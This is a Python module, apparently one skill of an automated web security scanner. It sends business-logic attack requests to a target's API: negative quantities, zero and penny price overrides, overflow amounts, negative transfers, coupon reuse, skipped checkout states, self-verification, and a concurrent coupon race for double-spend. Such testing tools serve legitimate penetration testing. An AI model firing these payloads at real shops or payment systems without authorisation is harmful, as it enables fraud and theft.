"""Skill: test_business_logic — negative quantities, price manipulation, state skipping."""
from __future__ import annotations
import asyncio
import logging
from typing import Any

logger = logging.getLogger(__name__)

LOGIC_TESTS: list[dict[str, Any]] = [
    # Negative quantity
    {"path": "/api/cart/add", "method": "POST", "body": {"product_id": 1, "quantity": -1},
     "desc": "Negative quantity in cart", "severity": "high"},
    {"path": "/api/orders", "method": "POST", "body": {"items": [{"id": 1, "qty": -100}]},
     "desc": "Negative quantity in order", "severity": "high"},
    # Zero price
    {"path": "/api/cart/add", "method": "POST", "body": {"product_id": 1, "quantity": 1, "price": 0},
     "desc": "Zero price override", "severity": "critical"},
    {"path": "/api/orders", "method": "POST", "body": {"items": [{"id": 1, "price": 0.01}]},
     "desc": "Penny price override", "severity": "critical"},
    # Large values / overflow
    {"path": "/api/cart/add", "method": "POST", "body": {"product_id": 1, "quantity": 2147483647},
     "desc": "Integer overflow quantity", "severity": "high"},
    {"path": "/api/transfer", "method": "POST", "body": {"amount": -1000, "to": "attacker"},
     "desc": "Negative transfer amount", "severity": "critical"},
    {"path": "/api/transfer", "method": "POST", "body": {"amount": 99999999999, "to": "attacker"},
     "desc": "Overflow transfer amount", "severity": "high"},
    # Coupon reuse
    {"path": "/api/coupon/apply", "method": "POST", "body": {"code": "DISCOUNT50"},
     "desc": "Coupon reuse attempt", "severity": "medium"},
    {"path": "/api/promo", "method": "POST", "body": {"code": "FREESHIP", "apply_count": 10},
     "desc": "Multi-apply coupon", "severity": "medium"},
    # State transition skip
    {"path": "/api/checkout/confirm", "method": "POST", "body": {"order_id": 1, "step": 3},
     "desc": "Skip to final checkout step", "severity": "high"},
    {"path": "/api/orders/1/ship", "method": "POST", "body": {},
     "desc": "Ship without payment", "severity": "critical"},
    {"path": "/api/account/verify", "method": "POST", "body": {"verified": True},
     "desc": "Self-verify account", "severity": "high"},
    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
]


async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Test business logic vulnerabilities.

    Returns:
        {"vulnerable": bool, "findings": [...], "tested": int}
    """
    import httpx

    target = target_url.rstrip("/")
    findings: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    auth_headers: dict[str, str] = {}
    if token:
        auth_headers["Authorization"] = f"Bearer {token}"

    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        async def run_test(t: dict[str, Any]) -> None:
            nonlocal tested
            async with sem:
                tested += 1
                url = f"{target}{t['path']}"
                try:
                    if t["method"] == "POST":
                        r = await client.post(url, json=t["body"], headers=auth_headers)
                    elif t["method"] == "PUT":
                        r = await client.put(url, json=t["body"], headers=auth_headers)
                    else:
                        return

                    # Logic flaw indicators: accepted when it shouldn't be
                    if r.status_code in (200, 201, 202):
                        body = r.text.lower()
                        # Check for negative/zero amounts being accepted
                        error_indicators = ["invalid", "cannot", "negative", "not allowed", "error"]
                        if not any(ind in body for ind in error_indicators):
                            findings.append({
                                "type": "business_logic",
                                "payload": f"{t['method']} {t['path']} body={t['body']}",
                                "evidence": f"{t['desc']}: accepted (status {r.status_code})",
                                "response_preview": r.text[:300],
                                "severity": t["severity"],
                            })
                            logger.info("Business logic: %s", t["desc"])
                except Exception:
                    pass

        await asyncio.gather(*[run_test(t) for t in LOGIC_TESTS])

        # --- Race condition: double-spend ---
        tested += 1
        async with sem:
            try:
                tasks = [
                    client.post(f"{target}/api/coupon/apply",
                                json={"code": "RACE_TEST"}, headers=auth_headers)
                    for _ in range(5)
                ]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successes = [r for r in results if not isinstance(r, Exception) and hasattr(r, "status_code") and r.status_code in (200, 201)]
                if len(successes) > 1:
                    findings.append({
                        "type": "race_condition",
                        "payload": "5 concurrent coupon applies",
                        "evidence": f"{len(successes)} of 5 succeeded (possible double-spend)",
                        "severity": "high",
                    })
            except Exception:
                pass

    return {"vulnerable": len(findings) > 0, "findings": findings, "tested": tested}
